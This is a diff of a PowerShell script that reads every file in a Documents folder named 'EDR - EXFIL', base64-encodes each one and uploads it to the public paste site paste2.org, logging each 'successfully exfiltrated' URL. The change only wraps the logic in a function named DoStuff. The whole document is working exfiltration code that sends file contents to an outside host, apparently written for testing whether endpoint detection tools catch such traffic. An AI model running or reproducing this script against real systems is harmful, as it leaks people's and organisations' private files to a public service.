@@ -1,36 +1,41 @@
-$dir = $env:SystemDrive + $env:HOMEPATH + '\Documents\EDR - EXFIL'
-$files = gci $dir
-$output = $dir + '\output.txt'
-
-ForEach ($file in $files)
+Function DoStuff
 {
-    $file = $file.FullName
+    $dir = $env:SystemDrive + $env:HOMEPATH + '\Documents\EDR - EXFIL'
+    $files = gci $dir
+    $output = $dir + '\output.txt'
 
-    Try
+    ForEach ($file in $files)
     {
-        $bytes = [System.IO.File]::ReadAllBytes($file)
-        $base64string = [System.Convert]::ToBase64String($bytes)
+        $file = $file.FullName
 
-        $base64string = $base64string.Replace('+', '%2B')
+        Try
+        {
+            $bytes = [System.IO.File]::ReadAllBytes($file)
+            $base64string = [System.Convert]::ToBase64String($bytes)
 
-        $request = Invoke-WebRequest -URI 'https://paste2.org' -Method Post -Body "code=$base64string&lang=text&description=&parent=" -OutVariable response
+            $base64string = $base64string.Replace('+', '%2B')
+
+            $request = Invoke-WebRequest -URI 'https://paste2.org' -Method Post -Body "code=$base64string&lang=text&description=&parent=" -OutVariable response
         
-        If ($request.ParsedHtml.title -match 'Viewing Paste')
-        {
+            If ($request.ParsedHtml.title -match 'Viewing Paste')
+            {
 
-            $id = $request.ParsedHtml.title.Split(' ')[-1]
-            $url = "https://paste2.org/" + $id
+                $id = $request.ParsedHtml.title.Split(' ')[-1]
+                $url = "https://paste2.org/" + $id
 
-            echo "'$file' successfully exfiltrated `nURL: $url" >> $output
+                echo "'$file' successfully exfiltrated `nURL: $url" >> $output
 
+            }
+            Else
+            {
+                echo "'$file' - Something went wrong!" >> $output
+            }
         }
-        Else
+        Catch
         {
-            echo "'$file' - Something went wrong!" >> $output
+            echo "'$File' - Something went wrong! `n$_" >> $output
         }
-    }
-    Catch
-    {
-        echo "'$File' - Something went wrong! `n$_" >> $output
     }
 }
+
+DoStuff
